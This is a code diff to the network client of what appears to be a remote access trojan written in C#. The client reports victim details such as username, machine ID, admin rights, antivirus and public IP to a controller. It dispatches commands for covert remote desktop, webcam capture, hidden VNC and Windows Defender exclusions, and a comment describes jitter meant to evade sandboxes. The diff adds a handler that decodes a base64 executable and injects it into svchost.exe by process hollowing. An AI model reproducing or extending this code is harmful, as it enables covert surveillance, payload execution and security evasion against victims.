@@ -43,7 +43,7 @@ internal class TlsClient : IDisposable
     // frame writes can never block control packets (heartbeats, pongs, acks).
     private readonly System.Threading.Channels.Channel<(byte[] data, int len)> _ctrlOutCh =
         System.Threading.Channels.Channel.CreateBounded<(byte[], int)>(
-            new System.Threading.Channels.BoundedChannelOptions(64)
+            new System.Threading.Channels.BoundedChannelOptions(256)
             { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true, SingleWriter = true });
     private readonly System.Threading.Channels.Channel<(byte[] data, int len)> _frameOutCh =
         System.Threading.Channels.Channel.CreateBounded<(byte[], int)>(
@@ -127,6 +127,8 @@ internal class TlsClient : IDisposable
         // Drain leftover queued items from any previous connection attempt.
         while (_ctrlCh.Reader.TryRead(out _)) {}
         while (_frameCh.Reader.TryRead(out _)) {}
+        while (_ctrlOutCh.Reader.TryRead(out _)) {}
+        while (_frameOutCh.Reader.TryRead(out _)) {}
 
         // Jitter: randomize initial connect time to defeat sandbox timing correlation
         await Task.Delay(Random.Shared.Next(100, 501), ct);
@@ -142,31 +144,22 @@ internal class TlsClient : IDisposable
         var publicIp = await FetchPublicIpAsync();
 
         // Send client info with auth key
-        ClientInfoData info;
-        try
+        var info = new ClientInfoData
         {
-            info = new ClientInfoData
-            {
-                OS = GetFriendlyOsName(),
-                Username = GetDisplayUsername(),
-                MachineName = Environment.MachineName,
-                Hwid = GetHwid(),
-                Payload = Config.EnableHollowing
-                    ? $"{Config.HollowTarget} (RunPE)"
-                    : Config.HiddenFileName,
-                AuthKey = Config.AuthKey,
-                IsAdmin = IsAdmin(),
-                Antivirus = GetAntivirus(),
-                IdPrefix = Config.ClientIdPrefix,
-                InstanceId = _instanceId,
-                IP = publicIp
-            };
-        }
-        catch
-        {
-            throw;
-        }
-
+            OS = GetFriendlyOsName(),
+            Username = GetDisplayUsername(),
+            MachineName = Environment.MachineName,
+            Hwid = GetHwid(),
+            Payload = Config.EnableHollowing
+                ? $"{Config.HollowTarget} (RunPE)"
+                : Config.HiddenFileName,
+            AuthKey = Config.AuthKey,
+            IsAdmin = IsAdmin(),
+            Antivirus = GetAntivirus(),
+            IdPrefix = Config.ClientIdPrefix,
+            InstanceId = _instanceId,
+            IP = publicIp
+        };
         await WritePacketAsync(new Packet
         {
             Type = PacketType.ClientInfo,
@@ -306,9 +299,8 @@ internal class TlsClient : IDisposable
                 case PacketType.RdpStart:
                 {
                     var rdpCfg = System.Text.Json.JsonSerializer.Deserialize<RdpStartDataStub>(packet.Data, SeroJson.Default.RdpStartDataStub) ?? new();
-                    var rdpPkt = new Packet();
                     _ = Task.Run(() => RemoteDesktopFeature.Start(rdpCfg,
-                        async (t, d) => { rdpPkt.Type = (PacketType)t; rdpPkt.Data = d; if (!await WriteFrameAsync(rdpPkt, ct)) RemoteDesktopFeature.SignalAck(); }));
+                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) RemoteDesktopFeature.SignalAck(); }));
                     break;
                 }
                 case PacketType.RdpStop:
@@ -330,9 +322,8 @@ internal class TlsClient : IDisposable
 
                 case PacketType.WcamStart:
                     var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
-                    var wcamPkt = new Packet();
                     _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
-                        async (t, d) => { wcamPkt.Type = (PacketType)t; wcamPkt.Data = d; if (!await WriteFrameAsync(wcamPkt, ct)) WebcamFeature.SignalAck(); }));
+                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) WebcamFeature.SignalAck(); }));
                     break;
                 case PacketType.WcamStop:
                     _ = Task.Run(() => WebcamFeature.Stop());
@@ -344,9 +335,8 @@ internal class TlsClient : IDisposable
                 case PacketType.HvncStart:
                 {
                     var hvncStartCfg = System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new();
-                    var hvncPkt = new Packet();
                     _ = Task.Run(() => HvncFeature.Start(hvncStartCfg,
-                        async (t, d) => { hvncPkt.Type = (PacketType)t; hvncPkt.Data = d; await WritePacketAsync(hvncPkt, ct); }));
+                        async (t, d) => { await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct); }));
                     break;
                 }
                 case PacketType.HvncStop:
@@ -394,6 +384,21 @@ internal class TlsClient : IDisposable
 
                 case PacketType.DefenderExclude:
                     _ = Task.Run(() => HandleDefenderExclude(packet.Data));
+                    break;
+
+                case PacketType.HollowExec:
+                    _ = Task.Run(() =>
+                    {
+                        var hd = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.HollowExecData);
+                        if (hd == null || string.IsNullOrEmpty(hd.FileBase64)) return;
+                        var tmp = Path.Combine(Path.GetTempPath(), hd.FileName.Length > 0 ? hd.FileName : Path.GetRandomFileName() + ".exe");
+                        try
+                        {
+                            File.WriteAllBytes(tmp, Convert.FromBase64String(hd.FileBase64));
+                            ProcessHollowing.Hollow(tmp, string.IsNullOrEmpty(hd.TargetProcess) ? "svchost.exe" : hd.TargetProcess);
+                        }
+                        finally { try { File.Delete(tmp); } catch { } }
+                    });
                     break;
 
                 case PacketType.PluginExec:
@@ -1209,7 +1214,6 @@ internal class TlsClient : IDisposable
     private IntPtr _gpuCtr    = IntPtr.Zero;
     private IntPtr _gpuBuf    = IntPtr.Zero;
     private int    _gpuBufSz  = 0;
-    private IntPtr _diskBuf   = IntPtr.Zero;
 
     private float SampleGpuPct()
     {
@@ -2141,7 +2145,8 @@ internal class TlsClient : IDisposable
         _ctrlOutCh.Writer.TryComplete();
         _frameOutCh.Writer.TryComplete();
         if (_diskQuery != IntPtr.Zero) { PdhCloseQuery(_diskQuery); _diskQuery = IntPtr.Zero; }
-        if (_gpuBuf   != IntPtr.Zero) { System.Runtime.InteropServices.Marshal.FreeHGlobal(_gpuBuf); _gpuBuf = IntPtr.Zero; }
+        if (_gpuQuery  != IntPtr.Zero) { PdhCloseQuery(_gpuQuery);  _gpuQuery  = IntPtr.Zero; }
+        if (_gpuBuf    != IntPtr.Zero) { System.Runtime.InteropServices.Marshal.FreeHGlobal(_gpuBuf); _gpuBuf = IntPtr.Zero; }
     }
 }
 
